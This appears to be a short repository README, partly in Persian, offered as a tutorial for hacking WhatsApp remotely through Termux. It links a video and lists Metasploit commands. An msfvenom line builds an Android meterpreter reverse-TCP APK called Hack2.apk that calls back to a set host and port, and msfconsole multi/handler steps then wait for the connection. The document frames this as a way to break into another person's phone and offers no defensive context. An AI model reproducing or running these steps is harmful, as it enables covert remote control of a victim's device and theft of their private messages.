# hack-cod-whatsapp-Termux-
آموزش  هک واتچاپ  از  دور
فیلم  آموزش 
https://youtu.be/SnnPQzZyQKU

ifconfig
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.78.129 LPORT=4444 R > Hack2.apk

msfconsole

use exploit/multi/handler

set payload android/meterpreter/reverse_tcp

set LHOST

set LPORT

exploit
